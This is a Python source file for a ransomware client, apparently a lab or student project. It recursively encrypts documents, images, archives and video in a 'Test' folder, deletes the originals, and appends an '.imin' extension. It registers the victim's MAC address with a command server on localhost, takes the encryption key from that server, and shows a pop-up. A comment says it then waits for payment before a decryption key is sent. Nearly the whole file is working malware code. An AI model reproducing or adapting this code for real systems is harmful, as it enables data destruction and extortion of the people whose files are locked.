import os
from pathlib import Path
from cryptography.fernet import Fernet
import socket
import select
import sys
from threading import *
import uuid
import time

import interface

'''
    Function to recursively scan a directory and give a list of filepaths
    baseDir: the starting directory to begin searching from
'''
def recursiveScan(baseDir):
    # scan current directory
    for entry in os.scandir(baseDir):
        if entry.is_file():
            # is file
            yield entry
        else:
            # if folder, start a new scan of contents
            yield from recursiveScan(entry.path)

'''
    Function to encrypt a specific file
    file: filepath to be encrypted
    key: key to use for encrypting
'''
def encrypt(file, key):
    # generating a fernet key
    f = Fernet(key)

    # get the data from the file
    with open(file, 'rb') as fl:
        original = fl.read()
    
    # encrypt the data
    encrypted = f.encrypt(original)

    # generate a custom, .imin file
    filename = str(file) + '.imin'
    encFile = Path(filename)
    
    # write to a new file with the new extension
    with open(encFile, 'wb+') as fl:
        fl.write(encrypted)

    # remove the old file
    os.remove(file)

'''
    Function to decrypt a specific file
    file: filepath to be decrypted
    key: key to use for decrypting
'''
def decrypt(file, key):
    # generate a fernet key
    f = Fernet(key)

    # get the data from the file
    with open(file, 'rb') as fl:
        encrypted = fl.read()
    
    # decrypt the data
    decrypted = f.decrypt(encrypted)

    # remove the .imin extension from new filename
    filename = str(file).split('.imin')[0]
    decFile = Path(filename)

    # write to the new, decrypted file
    with open(decFile, 'wb+') as fl:
        fl.write(decrypted)
    
    # remove the old, encrypted file
    os.remove(file)

'''
    Function to call encrypt on all files in the given directory
    key : key to use in encryption
'''
def encryptFiles(key):
    # list of filetypes to avoid when encrypting
    #exclude = ['.py','.pem', '.exe', '.imin']
    include = ['.pdf','.txt','.docx','.xlsx','.ppm','.tar','.zip','.jpeg','.mp4','.jar','.png','.gif']
    # loop through our filesystem
    for item in recursiveScan(os.getcwd() + '\Test'): 
        # generate the path
        filePath = Path(item)
        extension = filePath.suffix.lower()


        #if extension in exclude:
        #    continue
        # if the file isn't one of the exclude filetypes, encrypt it
        #if file is in include filetypes, encrypt it
        if extension in include:
            encrypt(filePath, key)
       
'''
    Function to call decrypt on all files in the given directory
    key : key to use in decryption
'''
def decryptFiles(key):
    # Loop through the filesystem
    for item in recursiveScan(os.getcwd() + '\Test'): 
        # make filepath
        filePath = Path(item)
        extension = filePath.suffix.lower()

        # decrypt if file has been encrypted before
        if extension == '.imin':
            decrypt(filePath, key)

if __name__ == "__main__":
    # using MAC address as an ID for the server
    MESSAGE = hex(uuid.getnode())

    # hardcoded IP and Port
    HOST = 'localhost'
    PORT = 5789

    # set up our socket to connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print('Connected!')
    s.send(bytes(MESSAGE, "utf-8"))

    while True:
        read_sockets, write_sockets, error_sockets = select.select([s], [], [])

        # key = encrypt
        # wait = decrypt
        for sock in read_sockets:
            if sock == s:
                data = s.recv(4096)
                if not data:
                    sys.exit()
                
                else:
                    
                    ''' 
                    if we recieve a 'wait', this means we have already encrypted
                    and should just wait until payment is complete
                    '''
                    if data.decode() != 'wait':
                        print("encrypting")
                        key = data.decode()
                        encryptFiles(key)
                    
                    # set up thread for tkinter window
                    t1 = Thread(target=interface.App().pop_up_win)
                    t1.daemon = True
                    t1.start()

                    # recv waits for new input of key to decrypt
                    key = s.recv(4096)
                    # upon receiving a key from the server, proceed to decrypt files
                    decryptFiles(key.decode())

                    print("Files have been decrypted.")
                    sys.exit()
